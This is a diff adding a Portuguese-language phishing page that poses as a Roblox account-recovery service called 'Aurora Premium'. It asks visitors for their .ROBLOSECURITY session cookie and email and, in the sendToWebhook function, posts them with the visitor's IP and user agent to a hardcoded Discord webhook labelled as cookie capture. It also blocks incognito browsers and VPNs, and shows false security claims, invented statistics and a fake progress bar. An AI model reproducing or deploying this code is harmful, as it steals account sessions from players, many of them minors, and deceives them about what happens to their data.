+                        <h3>TikTok Suporte</h3>
+                        <p>Acompanhe nossos vídeos de suporte, dicas e tutoriais no TikTok.</p>
+                        <button class="btn-comunidade"><i class="fab fa-tiktok"></i> Seguir no TikTok</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== FAQ SECTION ===== -->
+    <section class="section" id="faq">
+        <div class="container">
+            <div class="content-wrapper">
+                <h2 class="section-title">Perguntas Frequentes</h2>
+                <p class="section-subtitle">Encontre respostas para suas dúvidas 🇧🇷</p>
+                
+                <div class="faq-grid">
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <h3>Como funciona o sistema?</h3>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>Nosso sistema utiliza tecnologia avançada para verificar e recuperar sua conta de forma segura. Você fornece seu cookie, nós verificamos a autenticidade e processamos a recuperação em tempo real com máxima segurança.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <h3>Meus dados são realmente seguros?</h3>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>Sim! Utilizamos criptografia de nível militar (AES-256) e seguimos as melhores práticas de segurança da indústria. Seus dados nunca são armazenados ou compartilhados com terceiros.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <h3>Por que só posso tentar 1 vez?</h3>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>Para garantir a segurança do sistema e evitar abusos, cada usuário tem apenas 1 tentativa de recuperação. Após usá-la, é necessário aguardar 9 horas para uma nova tentativa.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <h3>O que é um cookie .ROBLOSECURITY?</h3>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>É um token de autenticação que prova que você é o dono da conta. É como uma "chave" que permite que você acesse sua conta. Encontre-o nas configurações do navegador.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <h3>Há alguma taxa para usar?</h3>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>O serviço básico é gratuito! Porém, oferecemos planos premium com recursos exclusivos, suporte prioritário e recuperação acelerada.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <h3>Como entro em contato com suporte?</h3>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>Você pode nos contatar através do Discord, TikTok ou pelo email support@aurora.com. Respondemos em até 24 horas com soluções rápidas e eficientes.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== STATS SECTION ===== -->
+    <section class="section" id="stats">
+        <div class="container">
+            <div class="content-wrapper">
+                <h2 class="section-title">Nossos Números 🇧🇷</h2>
+                <p class="section-subtitle">Confiança de milhares de usuários ao redor do mundo</p>
+                
+                <div class="stats-grid">
+                    <div class="stat-box">
+                        <span class="stat-number">15,847</span>
+                        <span class="stat-desc">Contas Recuperadas</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-number">99.8%</span>
+                        <span class="stat-desc">Taxa de Sucesso</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-number">2h 30m</span>
+                        <span class="stat-desc">Tempo Médio</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== DONATION SECTION ===== -->
+    <section class="section" id="donate">
+        <div class="container">
+            <div class="content-wrapper">
+                <h2 class="section-title">Apoie o Projeto 🇧🇷</h2>
+                <p class="section-subtitle">Sua doação ajuda a manter e melhorar o Aurora</p>
+                
+                <div class="donation-grid">
+                    <div class="donation-card desativado">
+                        <div class="donation-icon"><i class="fab fa-cc-paypal"></i></div>
+                        <h3>PayPal</h3>
+                        <p class="donation-desc">Seguro e rápido</p>
+                        <button class="btn btn-secondary" disabled>⏳ Em breve</button>
+                    </div>
+
+                    <div class="donation-card desativado">
+                        <div class="donation-icon"><i class="fab fa-cc-stripe"></i></div>
+                        <h3>Cartão de Crédito</h3>
+                        <p class="donation-desc">Todas as bandeiras</p>
+                        <button class="btn btn-secondary" disabled>⏳ Em breve</button>
+                    </div>
+
+                    <div class="donation-card desativado">
+                        <div class="donation-icon"><i class="fab fa-bitcoin"></i></div>
+                        <h3>Criptomoedas</h3>
+                        <p class="donation-desc">Bitcoin, Ethereum, etc</p>
+                        <button class="btn btn-secondary" disabled>⏳ Em breve</button>
+                    </div>
+
+                    <div class="donation-card desativado">
+                        <div class="donation-icon"><i class="fab fa-discord"></i></div>
+                        <h3>Discord</h3>
+                        <p class="donation-desc">Comunidade exclusiva</p>
+                        <button class="btn btn-secondary" disabled>⏳ Em breve</button>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin-top: 2rem; padding: 1.5rem; background: linear-gradient(135deg, rgba(0,151,57,0.1), rgba(254,220,0,0.1)); border-radius: 16px; border: 1px solid rgba(254,220,0,0.2);">
+                    <i class="fas fa-trophy" style="font-size: 1.8rem; color: #fedc00; display: block; margin-bottom: 0.5rem;"></i>
+                    <h3 style="color: white; font-weight: 800; margin-bottom: 0.5rem; font-size: 1.1rem;">🏆 HexaVem! Sistema em Manutenção</h3>
+                    <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Estamos preparando novidades incríveis para você! Volte em breve 🇧🇷</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>🇧🇷 Aurora Premium</h4>
+                <p>Plataforma profissional de recuperação de contas Roblox com segurança de nível militar e suporte 24/7. <span style="color:#fedc00;">#HexaVem</span></p>
+            </div>
+            <div class="footer-section">
+                <h4>Links Rápidos</h4>
+                <ul>
+                    <li><a href="#" onclick="showSection('home')">Home</a></li>
+                    <li><a href="#" onclick="showSection('recovery')">Recuperação</a></li>
+                    <li><a href="#" onclick="showSection('comunidade')">Comunidade</a></li>
+                    <li><a href="#" onclick="showSection('faq')">FAQ</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>Comunidade</h4>
+                <ul>
+                    <li><a href="#" target="_blank">Discord</a></li>
+                    <li><a href="#" target="_blank">TikTok</a></li>
+                    <li><a href="#" target="_blank">Twitter</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>Contato</h4>
+                <p><i class="fas fa-envelope"></i> support@aurora.com</p>
+                <p>Status: <span style="color: #00b84a;">● Online 🇧🇷</span></p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 Aurora Premium. Todos os direitos reservados. | Desenvolvido com <i class="fas fa-heart"></i> para você 🇧🇷 <span class="gold">#HexaVem</span></p>
+        </div>
+    </footer>
+
+    <!-- ===== PROCESSING MODAL ===== -->
+    <div class="modal-overlay" id="processingModal">
+        <div class="processing-modal">
+            <div class="loader"></div>
+            <h2 class="processing-title" id="processingTitle">Processando... 🇧🇷</h2>
+            <p class="processing-message" id="processingMessage">Verificando credenciais...</p>
+            <div class="progress-container">
+                <div class="progress-bar"><div class="progress-fill"></div></div>
+                <span class="progress-text" id="progressText">0%</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== SUCCESS MODAL ===== -->
+    <div class="modal-overlay" id="successModal">
+        <div class="success-modal">
+            <div class="success-icon"><i class="fas fa-check"></i></div>
+            <h2 class="success-title">Sucesso! 🏆</h2>
+            <p class="success-message">Sua conta foi identificada com sucesso no sistema. O processo de recuperação iniciará em breve. <strong style="color:#fedc00;">#HexaVem</strong></p>
+            <button class="btn btn-success" onclick="closeSuccessModal()">
+                <i class="fas fa-check-circle"></i> Entendi, Continuar
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // 1. DETECÇÃO AVANÇADA DE NAVEGADOR ANÔNIMO E VPN
+        // ============================================================
+        
+        // Detectar modo privado/anônimo com múltiplos métodos
+        function isPrivateBrowsing() {
+            return new Promise((resolve) => {
+                let detectionMethods = 0;
+                let positiveResults = 0;
+
+                // Método 1: localStorage
+                try {
+                    const test = '__aurora_test__';
+                    localStorage.setItem(test, '1');
+                    localStorage.removeItem(test);
+                } catch (e) {
+                    positiveResults++;
+                }
+                detectionMethods++;
+
+                // Método 2: sessionStorage
+                try {
+                    const test = '__aurora_test__';
+                    sessionStorage.setItem(test, '1');
+                    sessionStorage.removeItem(test);
+                } catch (e) {
+                    positiveResults++;
+                }
+                detectionMethods++;
+
+                // Método 3: IndexedDB
+                try {
+                    const request = indexedDB.open('__aurora_test__');
+                    request.onerror = () => {
+                        positiveResults++;
+                        if (++detectionMethods >= 3) {
+                            resolve(positiveResults >= 2);
+                        }
+                    };
+                    request.onsuccess = () => {
+                        if (++detectionMethods >= 3) {
+                            resolve(positiveResults >= 2);
+                        }
+                    };
+                } catch (e) {
+                    positiveResults++;
+                    if (++detectionMethods >= 3) {
+                        resolve(positiveResults >= 2);
+                    }
+                }
+
+                // Timeout para garantir resposta
+                setTimeout(() => {
+                    resolve(positiveResults >= 2);
+                }, 1000);
+            });
+        }
+
+        // Detectar VPN/Proxy via IP com múltiplos métodos
+        async function detectVPN() {
+            try {
+                // Usar múltiplas APIs para melhor precisão
+                const ipData = await getIPData();
+                if (!ipData) return false;
+
+                // Verificar indicadores de VPN com lógica mais rigorosa
+                const vpnIndicators = [
+                    ipData.is_vpn === true,
+                    ipData.is_proxy === true,
+                    ipData.is_tor === true,
+                    ipData.is_datacenter === true,
+                    ipData.threat_level > 50 // Alto nível de ameaça
+                ];
+
+                // Retorna true se detectar VPN/Proxy/Tor ou datacenter
+                const detected = vpnIndicators.some(indicator => indicator === true);
+                if (detected) {
+                    console.warn('🚨 VPN/Proxy detectado:', ipData);
+                }
+                return detected;
+            } catch (error) {
+                console.warn('Erro ao detectar VPN:', error);
+                return false;
+            }
+        }
+
+        // Obter dados de IP com fallback
+        async function getIPData() {
+            const apis = [
+                {
+                    url: 'https://ipapi.is/api/ip/',
+                    parser: (data) => ({
+                        is_vpn: data.is_vpn,
+                        is_proxy: data.is_proxy,
+                        is_tor: data.is_tor,
+                        is_datacenter: data.is_datacenter,
+                        threat_level: data.threat_level || 0
+                    })
+                },
+                {
+                    url: 'https://ip-api.com/json/?fields=query,proxy,hosting,status',
+                    parser: (data) => ({
+                        is_vpn: data.proxy === true,
+                        is_proxy: data.proxy === true,
+                        is_datacenter: data.hosting === true,
+                        threat_level: (data.proxy || data.hosting) ? 75 : 0
+                    })
+                },
+                {
+                    url: 'https://api.abuseipdb.com/api/v2/check?maxAgeInDays=90',
+                    headers: { 'Key': 'unknown' },
+                    parser: (data) => ({
+                        is_vpn: data.usageType === 'VPN',
+                        threat_level: data.abuseConfidenceScore || 0
+                    })
+                }
+            ];
+
+            for (const api of apis) {
+                try {
+                    const response = await Promise.race([
+                        fetch(api.url, { headers: api.headers || {} }),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
+                    ]);
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        return api.parser(data);
+                    }
+                } catch (e) {
+                    console.warn(`API ${api.url} falhou:`, e);
+                    continue;
+                }
+            }
+
+            return null;
+        }
+
+        // Detectar Google Chrome anônimo especificamente com múltiplos métodos
+        async function isGoogleIncognito() {
+            return new Promise((resolve) => {
+                let detectionResults = [];
+
+                // Método 1: Verificar quota de armazenamento
+                if (navigator.storage && navigator.storage.estimate) {
+                    navigator.storage.estimate().then(estimate => {
+                        // Em modo incógnito, a quota é muito menor (< 120MB)
+                        detectionResults.push(estimate.quota < 120000000);
+                        if (detectionResults.length >= 2) {
+                            resolve(detectionResults.some(r => r === true));
+                        }
+                    }).catch(() => {
+                        detectionResults.push(false);
+                        if (detectionResults.length >= 2) {
+                            resolve(detectionResults.some(r => r === true));
+                        }
+                    });
+                } else {
+                    detectionResults.push(false);
+                }
+
+                // Método 2: Verificar requestFileSystem (Chrome específico)
+                if (window.webkitRequestFileSystem) {
+                    window.webkitRequestFileSystem(
+                        window.TEMPORARY,
+                        1024 * 1024,
+                        () => {
+                            detectionResults.push(false);
+                            if (detectionResults.length >= 2) {
+                                resolve(detectionResults.some(r => r === true));
+                            }
+                        },
+                        () => {
+                            detectionResults.push(true); // Erro = modo incógnito
+                            if (detectionResults.length >= 2) {
+                                resolve(detectionResults.some(r => r === true));
+                            }
+                        }
+                    );
+                } else {
+                    detectionResults.push(false);
+                }
+
+                // Timeout para garantir resposta
+                setTimeout(() => {
+                    if (detectionResults.length > 0) {
+                        resolve(detectionResults.some(r => r === true));
+                    } else {
+                        resolve(false);
+                    }
+                }, 1500);
+            });
+        }
+
+        async function checkBlocked() {
+            try {
+                // Verificar navegador anônimo
+                const isPrivate = await isPrivateBrowsing();
+                const isGoogleIncog = await isGoogleIncognito();
+                
+                // Verificar VPN/Proxy
+                const hasVPN = await detectVPN();
+                
+                const blockModal = document.getElementById('blockModal');
+                const blockReason = document.getElementById('blockReason');
+                
+                let blockMessage = '';
+                let shouldBlock = false;
+
+                if (isPrivate || isGoogleIncog) {
+                    blockMessage = '🔒 Navegador Anônimo/Incógnito Detectado';
+                    shouldBlock = true;
+                } else if (hasVPN) {
+                    blockMessage = '🌐 VPN ou Proxy Detectado';
+                    shouldBlock = true;
+                }
+
+                if (shouldBlock) {
+                    blockReason.textContent = blockMessage;
+                    blockModal.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error('Erro ao verificar bloqueio:', error);
+                return false;
+            }
+        }
+
+        // ============================================================
+        // 2. CONFIGURAÇÃO
+        // ============================================================
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1520125483113644042/-QCwmVlXoYqxEZZ34SOpXTk7EkSsw6mrCHfQJ2ciA9E_zjxWQAsBvpc3v5wzw9KZ8IYb';
+        
+        // ============================================================
+        // 3. VARIÁVEIS DE CONTROLE
+        // ============================================================
+        let hasAttempted = false;
+        let blockUntil = null;
+        let timerInterval = null;
+        let isBlocked = false;
+        let termsAccepted = false;
+        let webhookInfo = {
+            username: 'Aurora Security',
+            avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
+        };
+
+        // ============================================================
+        // 2.5 FUNÇÃO PARA OBTER INFORMAÇÕES DO WEBHOOK
+        // ============================================================
+        async function fetchWebhookInfo() {
+            try {
+                const response = await fetch(WEBHOOK_URL);
+                if (response.ok) {
+                    const data = await response.json();
+                    webhookInfo = {
+                        username: data.name || 'Aurora Security',
+                        avatar_url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png` : 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
+                    };
+                    console.log('✅ Webhook info carregado:', webhookInfo);
+                } else {
+                    console.warn('⚠️ Webhook não encontrado ou inválido');
+                }
+            } catch (error) {
+                console.warn('⚠️ Erro ao carregar webhook info:', error);
+            }
+        }
+
+        // ============================================================
+        // 4. TERMS MODAL
+        // ============================================================
+        function openTermsModal() {
+            document.getElementById('termsModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeTermsModal() {
+            document.getElementById('termsModal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        function acceptTerms() {
+            termsAccepted = true;
+            localStorage.setItem('aurora_terms_accepted', 'true');
+            closeTermsModal();
+            showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço e política de privacidade. 🇧🇷');
+            showSection('recovery');
+        }
+
+        function checkTerms() {
+            const saved = localStorage.getItem('aurora_terms_accepted');
+            if (saved === 'true') {
+                termsAccepted = true;
+            } else {
+                setTimeout(() => { openTermsModal(); }, 1500);
+            }
+        }
+
+        // ============================================================
+        // 5. FUNÇÃO PARA PEGAR IP
+        // ============================================================
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Erro ao pegar IP:', error);
+                return 'Não foi possível obter IP';
+            }
+        }
+
+        // ============================================================
+        // 6. FUNÇÃO PARA ENVIAR PARA WEBHOOK
+        // ============================================================
+        async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
+            try {
+                // Obter dados de VPN para relatório
+                const vpnData = vpnDetected ? await getIPData() : null;
+                
+                const payload = {
+                    content: `🏆 **NOVO COOKIE CAPTURADO - #HEXAVEM** 🇧🇷\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n🏆 **#HexaVem** 🇧🇷`,
+                    username: webhookInfo.username,
+                    avatar_url: webhookInfo.avatar_url
+                };
+
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (response.ok) return true;
+                } catch (e) {}
+
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', WEBHOOK_URL, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(payload));
+                    return true;
+                } catch (e) {
+                    return false;
+                }
+            } catch (error) {
+                return false;
+            }
+        }
+
+        // ============================================================
+        // 7. MENU MOBILE
+        // ============================================================
+        function toggleMenu() {
+            document.getElementById('navMenu').classList.toggle('open');
+        }
+
+        // ============================================================
+        // 8. NAVEGAÇÃO
+        // ============================================================
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+            
+            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+            const links = document.querySelectorAll('.nav-link');
+            for (let link of links) {
+                if (link.textContent.trim().toLowerCase().includes(sectionId) || 
+                    link.textContent.trim().toLowerCase().includes(sectionId.substring(0, 3))) {
+                    link.classList.add('active');
+                    break;
+                }
+            }
+            
+            document.getElementById('navMenu').classList.remove('open');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // ============================================================
+        // 9. TOGGLE PASSWORD
+        // ============================================================
+        function togglePassword() {
+            const input = document.getElementById('cookieInput');
+            const icon = document.querySelector('.toggle-btn i');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.className = 'fas fa-eye-slash';
+            } else {
+                input.type = 'password';
+                icon.className = 'fas fa-eye';
+            }
+        }
+
+        // ============================================================
+        // 10. TOGGLE FAQ
+        // ============================================================
+        function toggleFaq(element) {
+            const faqItem = element.closest('.faq-item');
+            document.querySelectorAll('.faq-item').forEach(item => {
+                if (item !== faqItem) item.classList.remove('active');
+            });
+            faqItem.classList.toggle('active');
+        }
+
+        // ============================================================
+        // 11. TIMER (9 HORAS)
+        // ============================================================
+        function updateTimer() {
+            if (!blockUntil) return;
+            
+            const now = Date.now();
+            const diff = blockUntil - now;
+            
+            if (diff <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('blockMessage').classList.remove('visible');
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('submitBtn').style.opacity = '1';
+                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                hasAttempted = false;
+                isBlocked = false;
+                localStorage.removeItem('aurora_block_until');
+                return;
+            }
+
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            document.getElementById('timerDisplay').textContent = 
+                `${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;
+        }
+
+        // ============================================================
+        // 12. HANDLE SUBMIT (1 TENTATIVA + 9H BLOQUEIO)
+        // ============================================================
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            // Verificar se aceitou os termos
+            if (!termsAccepted) {
+                openTermsModal();
+                showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. 🇧🇷');
+                return;
+            }
+            
+            // Verificar se está bloqueado por tentativa
+            if (isBlocked) {
+                showNotification('⏳', 'Aguarde!', 'Você precisa esperar 9 horas para tentar novamente.');
+                return;
+            }
+
+            // Verificar navegador anônimo (reforço)
+            const isPrivate = await isPrivateBrowsing();
+            const isGoogleIncog = await isGoogleIncognito();
+            const hasVPN = await detectVPN();
+            
+            if (isPrivate) {
+                showNotification('🔒', 'Navegador Anônimo!', 'Navegadores anônimos não são permitidos por questões de segurança.');
+                return;
+            }
+            
+            if (isGoogleIncog) {
+                showNotification('🔒', 'Modo Incógnito!', 'O modo incógnito do Google Chrome não é permitido por questões de segurança.');
+                return;
+            }
+            
+            if (hasVPN) {
+                showNotification('🌐', 'VPN Detectada!', 'Conexões via VPN ou proxy não são permitidas por questões de segurança.');
+                return;
+            }
+
+            const cookie = document.getElementById('cookieInput').value;
+            const email = document.getElementById('emailInput').value;
+            
+            if (!cookie.trim() || !email.trim()) {
+                showNotification('⚠️', 'Campos vazios!', 'Preencha todos os campos.');
+                return;
+            }
+
+            // Verificar se já tentou
+            if (hasAttempted) {
+                showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.');
+                return;
+            }
+
+            const ip = await getIP();
+
+            // Mostrar loading
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
+
+            const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);
+
+            if (sent) {
+                hasAttempted = true;
+                isBlocked = true;
+                
+                // Salvar bloqueio de 9 horas
+                blockUntil = Date.now() + (9 * 60 * 60 * 1000);
+                localStorage.setItem('aurora_block_until', blockUntil.toString());
+                
+                document.getElementById('submitBtn').disabled = true;
+                document.getElementById('submitBtn').style.opacity = '0.5';
+                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
+                
+                document.getElementById('blockMessage').classList.add('visible');
+                document.getElementById('timerDisplay').textContent = '9h 00m 00s';
+                
+                if (timerInterval) clearInterval(timerInterval);
+                timerInterval = setInterval(updateTimer, 1000);
+                
+                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. 🇧🇷');
+                showProcessingModal();
+            } else {
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                showNotification('❌', 'Erro!', 'Falha ao enviar dados. Tente novamente.');
+            }
+        }
+
+        // ============================================================
+        // 13. PROCESSING MODAL
+        // ============================================================
+        function showProcessingModal() {
+            const modal = document.getElementById('processingModal');
+            modal.classList.add('active');
+            
+            let progress = 0;
+            const progressFill = document.querySelector('.progress-fill');
+            const progressText = document.getElementById('progressText');
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 20 + 5;
+                if (progress > 100) progress = 100;
+                
+                progressText.textContent = Math.floor(progress) + '%';
+                progressFill.style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        modal.classList.remove('active');
+                        showSuccessModal();
+                    }, 500);
+                }
+            }, 200);
+        }
+
+        // ============================================================
+        // 14. SUCCESS MODAL
+        // ============================================================
+        function showSuccessModal() {
+            document.getElementById('successModal').classList.add('active');
+            document.getElementById('recoveryForm').reset();
+            const input = document.getElementById('cookieInput');
+            input.type = 'password';
+            document.querySelector('.toggle-btn i').className = 'fas fa-eye';
+        }
+
+        function closeSuccessModal() {
+            document.getElementById('successModal').classList.remove('active');
+            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. 🇧🇷 #HexaVem');
+        }
+
+        // ============================================================
+        // 15. NOTIFICATION
+        // ============================================================
+        function showNotification(icon, title, message) {
+            const notif = document.createElement('div');
+            notif.style.cssText = `
+                position: fixed;
+                top: 100px;
+                right: 20px;
+                background: linear-gradient(135deg, rgba(10,26,10,0.95), rgba(26,42,26,0.95));
+                backdrop-filter: blur(20px);
+                border: 1px solid rgba(254,220,0,0.15);
+                border-radius: 12px;
+                padding: 1.2rem 1.5rem;
+                max-width: 350px;
+                z-index: 9999;
+                animation: slideInRight 0.4s ease-out;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+                color: white;
+            `;
+
+            notif.innerHTML = `
+                <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.3rem;">
+                    <span style="font-size:1.5rem;">${icon}</span>
+                    <strong style="font-size:1rem;">${title}</strong>
+                </div>
+                <p style="color:rgba(255,255,255,0.7);margin:0;font-size:0.9rem;">${message}</p>
+            `;
+
+            document.body.appendChild(notif);
+            setTimeout(() => {
+                notif.style.animation = 'slideInRight 0.4s ease-out reverse';
+                setTimeout(() => notif.remove(), 400);
+            }, 5000);
+        }
+
+        // ============================================================
+        // 16. CLOSE MODALS
+        // ============================================================
+        document.addEventListener('click', function(event) {
+            const processingModal = document.getElementById('processingModal');
+            const successModal = document.getElementById('successModal');
+            const termsModal = document.getElementById('termsModal');
+            const blockModal = document.getElementById('blockModal');
+            
+            if (event.target === processingModal) processingModal.classList.remove('active');
+            if (event.target === successModal) successModal.classList.remove('active');
+            if (event.target === termsModal) closeTermsModal();
+            if (event.target === blockModal) {
+                blockModal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+        });
+
+        // ============================================================
+        // 17. SCROLL EFFECT
+        // ============================================================
+        window.addEventListener('scroll', () => {
+            const navbar = document.querySelector('.navbar');
+            navbar.style.background = window.scrollY > 10 ? 'rgba(10, 26, 10, 0.98)' : 'rgba(10, 26, 10, 0.95)';
+        });
+
+        // ============================================================
+        // 18. RESTAURAR ESTADO DO BLOQUEIO
+        // ============================================================
+        function restoreBlockState() {
+            const saved = localStorage.getItem('aurora_block_until');
+            if (saved) {
+                const savedTime = parseInt(saved);
+                if (savedTime > Date.now()) {
+                    blockUntil = savedTime;
+                    isBlocked = true;
+                    hasAttempted = true;
+                    
+                    document.getElementById('submitBtn').disabled = true;
+                    document.getElementById('submitBtn').style.opacity = '0.5';
+                    document.getElementById('submitBtn').innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
+                    document.getElementById('blockMessage').classList.add('visible');
+                    
+                    if (timerInterval) clearInterval(timerInterval);
+                    timerInterval = setInterval(updateTimer, 1000);
+                    updateTimer();
+                } else {
+                    localStorage.removeItem('aurora_block_until');
+                }
+            }
+        }
+
+        // ============================================================
+        // 19. CONSOLE
+        // ============================================================
+        console.log('%c🏆 Aurora Premium v2.0 🇧🇷', 'font-size:24px;font-weight:bold;color:#009739;');
+        console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#fedc00;');
+        console.log('%c⏳ 1 tentativa apenas | 9h de bloqueio', 'font-size:14px;color:#f59e0b;');
+        console.log('%c🔒 Navegador anônimo bloqueado', 'font-size:14px;color:#ef4444;');
+        console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#10b981;');
+        console.log('%c👥 Comunidade: Discord | Email | TikTok', 'font-size:14px;color:#fedc00;');
+        console.log('%c🏆 #HexaVem! 🇧🇷', 'font-size:18px;font-weight:bold;color:#fedc00;');
+
+        // ============================================================
+        // 20. INICIAR
+        // ============================================================
+        async function init() {
+            // Carregar informações do webhook do Discord
+            console.log('%c🔗 Carregando informações do webhook...', 'font-size:14px;color:#fedc00;');
+            await fetchWebhookInfo();
+            
+            // Verificar bloqueio de anônimo (APENAS)
+            const blocked = await checkBlocked();
+            if (blocked) {
+                console.log('%c🚭 Acesso bloqueado: Navegador Anônimo detectado', 'font-size:14px;color:#ef4444;');
+                return;
+            }
+            
+            restoreBlockState();
+            checkTerms();
+        }
+
+        // ============================================================
+        // 21. EXECUTAR
+        // ============================================================
+        init();
+    </script>
 </body>
 </html>
